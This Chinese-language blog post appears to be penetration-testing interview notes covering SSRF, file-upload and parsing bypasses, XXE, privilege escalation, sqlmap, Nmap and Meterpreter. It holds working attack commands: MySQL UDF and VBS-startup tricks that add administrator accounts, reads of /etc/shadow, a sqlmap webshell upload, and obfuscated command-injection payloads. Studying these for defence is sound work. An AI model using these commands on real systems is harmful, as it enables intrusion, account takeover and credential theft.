<h2 id="8-SSRF原理"><a href="#8-SSRF原理" class="headerlink" title="8-SSRF原理"></a>8-SSRF原理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1- 服务器允许向其他服务器获取资源</span><br><span class="line">2- 但是并没有对该地址做严格的过滤和限制</span><br><span class="line">3- 所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回</span><br></pre></td></tr></table></figure>
<h2 id="9-SSRF危害"><a href="#9-SSRF危害" class="headerlink" title="9-SSRF危害"></a>9-SSRF危害</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1- SSRF漏洞几乎无所不能</span><br><span class="line">2- SQL注入</span><br><span class="line">3- Sturts2</span><br><span class="line">4- 端口探测</span><br><span class="line">5- 敏感信息泄露</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最为主要的就是能够访问到外网无法访问的系统和服务器，漫游内网</span></span><br></pre></td></tr></table></figure>
<h2 id="10-SSRF防御"><a href="#10-SSRF防御" class="headerlink" title="10-SSRF防御"></a>10-SSRF防御</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1- 地址做白名单处理</span><br><span class="line">2- 域名识别ip,过滤内部ip</span><br><span class="line">3- 并校验返回的内容对比是否与假定的一致</span><br></pre></td></tr></table></figure>
<h2 id="11-文件上传分类"><a href="#11-文件上传分类" class="headerlink" title="11-文件上传分类"></a>11-文件上传分类</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1- 白名单</span><br><span class="line">2- 黑名单</span><br></pre></td></tr></table></figure>
<h2 id="12-文件上传的突破"><a href="#12-文件上传的突破" class="headerlink" title="12-文件上传的突破"></a>12-文件上传的突破</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1- 前端JS突破：抓包修改文件名 或者 禁用当前浏览器的JS脚本</span><br><span class="line">2- 后端突破：</span><br><span class="line">	2.1-黑名单：方法太多了 点、空格点、 php 1234567 、phphtml、分布式文件上传、文件流绕过....</span><br><span class="line">	2.2-白名单：比较鸡肋的00截断、时间竞争、双文件上传、双文件名...</span><br></pre></td></tr></table></figure>
<h2 id="13-你了解那些中间件"><a href="#13-你了解那些中间件" class="headerlink" title="13-你了解那些中间件"></a>13-你了解那些中间件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1- iis6.x</span><br><span class="line">2- Apache</span><br><span class="line">3- iis7.5</span><br><span class="line">4- Nginx</span><br><span class="line">5- Tomcat</span><br><span class="line">6- Weblogic</span><br><span class="line">7- Jboos</span><br></pre></td></tr></table></figure>
<h2 id="14-你会那些解析漏洞"><a href="#14-你会那些解析漏洞" class="headerlink" title="14-你会那些解析漏洞"></a>14-你会那些解析漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1- IIS6.X</span></span><br><span class="line">大多数为Windows server 2003，网站比较古老，如果要支持aspx,需要安装.NET框架</span><br><span class="line">	1.1- 利用2003系统的系统特性，但凡出现 \/.:;* 文件名的后面都会被舍弃</span><br><span class="line">			形式：www.xxx.com/xx.asp；.jpg</span><br><span class="line">	1.2-凡是文件名是apx结尾的，里面的任何文件都会被当作脚本语言解析</span><br><span class="line">	</span><br><span class="line">	1.3-除了asp、aspx以外，还有cer、cdx、asa 的后缀都可以被当作asp或者aspx脚本语言解析</span><br><span class="line">		形式：mamu.cer muma.cdx mamu.asa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2- Apache</span></span><br><span class="line">	1-muma.php.xxx.aaa 从左往右解析执行</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3- Nginx</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Nginx和 IIS7.5 都是因为开启了CGI.FIX_PATHINFO参数，默认是以CGI的方式支持PHP解析的</span></span><br><span class="line">	1- www.xxxx.com/1.jpg/1.php</span><br><span class="line"></span><br><span class="line">	2- www.xxxx.com/1.jpg%00.php</span><br><span class="line"></span><br><span class="line">	3- www.xxxx.com/1.jpg/%20\0.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4-IIS7.5</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">Nginx和 IIS7.5 都是因为开启了CGI.FIX_PATHINFO参数，默认是以CGI的方式支持PHP解析的</span></span><br><span class="line">	1-在任意后缀后面加上x.php	</span><br><span class="line">		形式：www.xxx.com/logo.jpg/x.php</span><br><span class="line">			 www.xxx.com/logo.txt/x.php</span><br><span class="line">			 www.xxx.com/logo.doc/x.php</span><br></pre></td></tr></table></figure>
<h2 id="15-未授权访问漏洞"><a href="#15-未授权访问漏洞" class="headerlink" title="15-未授权访问漏洞"></a>15-未授权访问漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常见的未授权访问漏洞：</span></span><br><span class="line"></span><br><span class="line">	1- Redis 未授权访问漏洞</span><br><span class="line">	2- MongoDB 未授权访问漏洞</span><br><span class="line">	3- Jenkins 未授权访问漏洞</span><br><span class="line">	4- Memcached 未授权访问漏洞</span><br><span class="line">	5- JBOSS 未授权访问漏洞</span><br><span class="line">	6- VNC 未授权访问漏洞</span><br><span class="line">	7- Docker 未授权访问漏洞</span><br><span class="line">	8- ZooKeeper 未授权访问漏洞</span><br><span class="line">	9- Rsync 未授权访问漏洞</span><br><span class="line">	10- Atlassian Crowd 未授权访问漏洞</span><br><span class="line">	11- CouchDB 未授权访问漏洞</span><br><span class="line">	12- Elasticsearch 未授权访问漏洞</span><br><span class="line">	13- Hadoop 未授权访问漏洞</span><br><span class="line">	14- Jupyter Notebook 未授权访问漏洞</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考链接： <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a> </p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a> </p>
<p>参考链接： <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/207877.html">https://www.freebuf.com/articles/web/207877.html</a> </p>
</blockquote>
<h2 id="16-XXE的原理"><a href="#16-XXE的原理" class="headerlink" title="16-XXE的原理"></a>16-XXE的原理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">XXE漏洞就是xml外部实体注入漏洞，</span></span><br><span class="line">通常和危害一起回答出来会感觉更加流畅和自然</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通常发生在应用程序解析XML输入时，没有禁止外部实体的加载，</span></span><br><span class="line">	导致可加载恶意外部文件，</span><br><span class="line">	造成文件读取、</span><br><span class="line">	命令执行、</span><br><span class="line">	内网端口扫描、</span><br><span class="line">	攻击内网网站、</span><br><span class="line">	发起dos攻击等危害。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="17-XXE的分类"><a href="#17-XXE的分类" class="headerlink" title="17-XXE的分类"></a>17-XXE的分类</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1- 有回显型XXE</span><br><span class="line">2- 无回显型XXE</span><br></pre></td></tr></table></figure>
<h2 id="补充：XXE有哪些引入方式"><a href="#补充：XXE有哪些引入方式" class="headerlink" title="补充：XXE有哪些引入方式"></a>补充：XXE有哪些引入方式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1- 本地映入</span><br><span class="line">2- 外部引入</span><br><span class="line">3- 外部参数实体引入</span><br></pre></td></tr></table></figure>
<h2 id="18-遇到XXE的盲注怎么办"><a href="#18-遇到XXE的盲注怎么办" class="headerlink" title="18-遇到XXE的盲注怎么办"></a>18-遇到XXE的盲注怎么办</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果遇到XXE无回显注入的话，可以选择使用DNS外带和 外部参数实体注入</span></span><br><span class="line">1- 在攻击者自己的公网服务器，准备一个test.dtd通过base64为将读取的内容加密得到的值当作传参值，发送给攻击者的公网服务器</span><br><span class="line"></span><br><span class="line">2-受害者那边，通过外部参数实体注入 访问攻击者公网服务器下的test.dtd文件</span><br><span class="line"></span><br><span class="line">3-最后看，攻击者公网服务器，的日志，转码得到受害者服务器的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="20-遇到那些框架"><a href="#20-遇到那些框架" class="headerlink" title="20-遇到那些框架"></a>20-遇到那些框架</h2><h2 id="21-win提权"><a href="#21-win提权" class="headerlink" title="21-win提权"></a>21-win提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-内核提权 systeminfo 寻找对应EXP</span><br></pre></td></tr></table></figure>
<h2 id="22-linux提权"><a href="#22-linux提权" class="headerlink" title="22-linux提权"></a>22-linux提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1- 脏牛提权</span><br><span class="line">2- sodu提权</span><br><span class="line">3- 内核提权</span><br></pre></td></tr></table></figure>
<h2 id="补充：说说你了解的脏牛提权"><a href="#补充：说说你了解的脏牛提权" class="headerlink" title="补充：说说你了解的脏牛提权"></a>补充：说说你了解的脏牛提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我当时没上来，有哪位老哥，比较好的答案，记得发给我啊，跪谢</span><br></pre></td></tr></table></figure>
<h2 id="23-数据库提权"><a href="#23-数据库提权" class="headerlink" title="23-数据库提权"></a>23-数据库提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MySQL</span></span><br><span class="line">	1- mof提权</span><br><span class="line">	2- udf提权</span><br><span class="line">	3- VBS启动项提权</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SQLserver</span></span><br><span class="line">	1-xp_cmdshell 扩展存储函数提权</span><br><span class="line">	2-差异备份提权</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Access</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="补充：MySQL-UDF提权的常用命令"><a href="#补充：MySQL-UDF提权的常用命令" class="headerlink" title="补充：MySQL UDF提权的常用命令"></a>补充：MySQL UDF提权的常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">select cmdshell(&#x27;net user liuyazhuang lyz123 /add&#x27;);</span><br><span class="line">select cmdshell(&#x27;net localgroup administrators liuyazhuang /add&#x27;);</span><br><span class="line">select cmdshell(&#x27;net localgroup administrators&#x27;);</span><br><span class="line">select cmdshell(&#x27;ipconfig/all&#x27;);</span><br><span class="line">select cmdshell(&#x27;net user&#x27;);</span><br><span class="line">select cmdshell(&#x27;regedit /s d:\wwwroot\3389.reg&#x27;);</span><br><span class="line">drop function cmdshell;</span><br><span class="line">select cmdshell(&#x27;netstat -an&#x27;);</span><br></pre></td></tr></table></figure>
<h2 id="补充：MySQL-VBS启动项提权"><a href="#补充：MySQL-VBS启动项提权" class="headerlink" title="补充：MySQL VBS启动项提权"></a>补充：MySQL VBS启动项提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原理概述</span></span><br><span class="line">先通过WebShell连接数据库，通过建立表a将VBS脚本写入表中，然后导入启动项。该脚本仅对中文版有效，如果使用其他语言版本的操作系统，仅需对&quot;C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs&quot;这个脚本进行相应更改。在VBS脚本后面有一个&quot;0&quot;，表示不弹出CMD窗口，以静默模式运行。该方法是在通过UDF提权失败的情况下，将VBS插入启动项中，待系统重启后将自动添加一个用户，</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行语句</span>	</span><br><span class="line">create table a (cmd text); # 创建一个a表 cmd字段 text是字段类型</span><br><span class="line">insert into a values(&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;) &quot; );# 在a表里插入了一个vbsshell语句</span><br><span class="line"></span><br><span class="line">insert into a values(&quot;a=wshshell.run(&quot;&quot;cmd.exe /c net user xxoo 123123 /add&quot;&quot;,0) &quot; );# 用VBSshell执行了一个添加用户的操作</span><br><span class="line"></span><br><span class="line">insert into a values(&quot;b=wshshell.run(&quot;&quot;cmd.exe /c net localgroup administrators xxoo /add&quot;&quot;,0) &quot; );# 用VBSshell 执行了将xxoo这个用户，添加到了管理员组</span><br><span class="line">select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\[开始]菜单\\程序\\启动\\a.vbs&quot;;	# 最后将a表里面的内容，插入到/写入到 启动项的目录下，并且保存文件名为a.vbs</span><br></pre></td></tr></table></figure>
<h2 id="补充：Linux下的MySQL提权"><a href="#补充：Linux下的MySQL提权" class="headerlink" title="补充：Linux下的MySQL提权"></a>补充：Linux下的MySQL提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -hlocalhost -uroot -p</span><br><span class="line">system useradd hacker</span><br><span class="line">system passwd hacker</span><br><span class="line">system tail -l /etc/passwd</span><br><span class="line">system tail -l /etc/shadow</span><br></pre></td></tr></table></figure>
<h2 id="24-说说SQLmap"><a href="#24-说说SQLmap" class="headerlink" title="24-说说SQLmap"></a>24-说说SQLmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1-SQLmap 是最强大的注入工具，没有之一，几乎所有的数据库都可以注入</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关键函数</span></span><br><span class="line">	--is-dba 								#当前用户权限（是否为root权限，mssql下最高权限为sa）</span><br><span class="line">	--dbs									#所有数据库</span><br><span class="line">	--current-db							#网站当前数据库</span><br><span class="line">	--users 								#所有数据库用户</span><br><span class="line">	--current-user 							#当前数据库用户</span><br><span class="line">	--random-agent 							#构造随机user-agent</span><br><span class="line">	--passwords 							#数据库密码</span><br><span class="line">	--proxy http://local:8080 –threads 10   #(可以自定义线程加速) 代理</span><br><span class="line">	--time-sec=TIMESEC DBMS					#响应的延迟时间（默认为5秒</span><br><span class="line">	--threads=                       		#使用多少线程</span><br><span class="line">	--batch									#自动化选择</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cookie注入</span></span><br><span class="line">	sqlmap.py -u &quot;http://www.xxx.com?id=1注入点&quot; --cookie=&quot;cookie值&quot; --current-db  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POST注入</span></span><br><span class="line">	sqlmap -r “数据包地址” -p “需要制定的参数” –dbms 需要制定的数据类型</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GET注入</span></span><br><span class="line">	sqomap -u “注入点地址” --dbs 跟上你需要的参数</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sqlmap进行交互式写shell</span></span><br><span class="line">	1-前提条件：最高权限、知道web网站绝对路径、能获取到cookie</span><br><span class="line">	2-    sqlmap.py -u &quot;注入点地址&quot; --cookie=&quot;cookie值&quot; --os-shell</span><br><span class="line">		2.1-echo “一句话木马”&gt;网站的绝对路径</span><br><span class="line">	3- 输入web网站的绝对路径</span><br><span class="line">	4-传木马</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<h2 id="25-说说Nmap"><a href="#25-说说Nmap" class="headerlink" title="25-说说Nmap"></a>25-说说Nmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Nmap 是一款网络扫描和主机检测的工具</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用的参数</span></span><br><span class="line">	nmap www.baidu.com　　  			  #扫描单一的一个主机）</span><br><span class="line">	nmap 192.168.1.154 　　　			　#扫描单一的一个主机）</span><br><span class="line">	nmap 192.168.1.1/24　　			 　#扫描整个子网</span><br><span class="line">	nmap 192.168.1.154 192.168.1.156    #扫描多个目标）</span><br><span class="line">	nmap 192.168.1.1-100 　　　　   	  #扫描IP地址为192.168.1.1-192.168.1.100内的所有主机</span><br><span class="line">	nmap -iL target.txt　　　　			  #扫描批量ip地址</span><br><span class="line">	nmap 192.168.1.1/24 -exclude 192.168.1.1 	 #扫描除过某一个 ip 外的所有子网主机</span><br><span class="line">	nmap 192.168.1.1/24 -exclude file xxx.txt  	 #xxx.txt 中的文件将会从扫描的主机中排除</span><br><span class="line">	nmap -p80,21,23 192.168.1.154　　				#扫描特定主机上的 80、21、23 端口</span><br><span class="line">	nmap -sS 192.168.1.1						 #半开放扫描比较喜欢用的一个</span><br><span class="line">	namap --script==vuln						 #扫漏洞，比较重的一个</span><br><span class="line">	namp -oN										 # 保存扫描结果</span><br><span class="line">	</span><br><span class="line">	基本这些就够用了，如果有大佬觉得还有更好的使用方式欢迎补充啊，跪谢</span><br></pre></td></tr></table></figure>
<h2 id="26-说说MSF"><a href="#26-说说MSF" class="headerlink" title="26-说说MSF"></a>26-说说MSF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用命令</span></span><br><span class="line">	background 					#让meterpreter处于后台模式</span><br><span class="line">	sessions -i number 			#与会话进行交互，number表示第n个session</span><br><span class="line">	quit 						#退出会话</span><br><span class="line">	shell 						#获得命令行</span><br><span class="line">	cat c:\\boot.ini 			#查看文件内容</span><br><span class="line">	getwd 						#查看当前工作目录 work directory</span><br><span class="line">	upload /root/Desktop/netcat.exe c:\\ 				# 上传文件到目标机上</span><br><span class="line">	download 0xfa.txt /root/Desktop/ 					# 下载文件到本机上</span><br><span class="line">	edit c:\\boot.ini 									# 编辑文件</span><br><span class="line">	search -d d:\\www -f web.config 					#search 文件</span><br><span class="line">	ps 													#查看当前活跃进程</span><br><span class="line">	migrate pid 									#将Meterpreter会话移植到进程数位pid的进程中</span><br><span class="line">	execute -H -i -f cmd.exe 						#创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line">	getpid 											#获取当前进程的pid</span><br><span class="line">	kill pid 										#杀死进程</span><br><span class="line">	getuid 											#查看权限</span><br><span class="line">	sysinfo 										#查看目标机系统信息，如机器名，操作系统等</span><br><span class="line">	getsystem 										#提权操作</span><br><span class="line">	timestompc:/a.doc -c &quot;10/27/2015 14:22:11&quot; 		#修改文件的创建时间</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">迁移进程</span></span><br><span class="line">	1-meterpreter &gt; ps</span><br><span class="line">	2-自行选择PID</span><br><span class="line">	3-meterpreter &gt; migrate pid</span><br><span class="line">	</span><br><span class="line">还可以做免杀木马等等。。。。MSF 蛮强大的</span><br></pre></td></tr></table></figure>
<h2 id="27-SQL注入bypass你会那些手法"><a href="#27-SQL注入bypass你会那些手法" class="headerlink" title="27-SQL注入bypass你会那些手法"></a>27-SQL注入bypass你会那些手法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1-等量替换</span><br><span class="line">2-参数污染HPP</span><br><span class="line">3-编码绕过</span><br><span class="line">4-SQL特性</span><br></pre></td></tr></table></figure>
<h2 id="28-文件上传怎么绕过"><a href="#28-文件上传怎么绕过" class="headerlink" title="28-文件上传怎么绕过"></a>28-文件上传怎么绕过</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="29-命令执行怎么绕过"><a href="#29-命令执行怎么绕过" class="headerlink" title="29-命令执行怎么绕过"></a>29-命令执行怎么绕过</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">cat 233.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">管道符号绕过</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">空格绕过</span> </span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%0a、%09</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重定向绕过</span></span><br><span class="line">	&lt; &lt;&gt; </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">变量拼接绕过</span></span><br><span class="line">	@kali:$ a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单引号、双引号绕过</span></span><br><span class="line">    ca&#x27;&#x27;t flag</span><br><span class="line">	cat&quot;&quot; flag</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编码绕过</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;<span class="built_in">cat</span> /flag</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="variable">$0</span> ==&gt;<span class="built_in">cat</span> /flag</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">$(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>) ==&gt;<span class="built_in">ls</span></span>	</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看等价替换</span></span><br><span class="line">	(1)more:一页一页的显示档案内容</span><br><span class="line">	(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">	(3)head:查看头几行</span><br><span class="line">	(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">	(5)tail:查看尾几行</span><br><span class="line">	(6)nl：显示的时候，顺便输出行号</span><br><span class="line">	(7)od:以二进制的方式读取档案内容</span><br><span class="line">	(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">	(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">	(10)sort:可以查看</span><br><span class="line">	(11)uniq:可以查看</span><br><span class="line">	(12)file -f:报错出具体内容</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反斜线绕过</span></span><br><span class="line">	c\at fl\ag</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内敛注释绕过</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">`命令`和$(命令)都是执行命令的方式</span></span><br><span class="line">	echo &quot;m0re`cat flag`&quot;</span><br><span class="line">	echo &quot;m0re $(cat flag)&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">base64</span>编码绕过</span></span><br><span class="line">	`echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">绕过长度限制</span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">&gt;命令会将原有文件内容覆盖</span></span><br><span class="line">	echo &#x27;123&#x27;&gt;xxoo.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span></span><br><span class="line">	echo &#x27;233&#x27;&gt;&gt;xxoo.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令换行绕过</span></span><br><span class="line">	ca\</span><br><span class="line">	a\</span><br><span class="line">	t\</span><br><span class="line">	fl\</span><br><span class="line"> 	ag</span><br></pre></td></tr></table></figure>
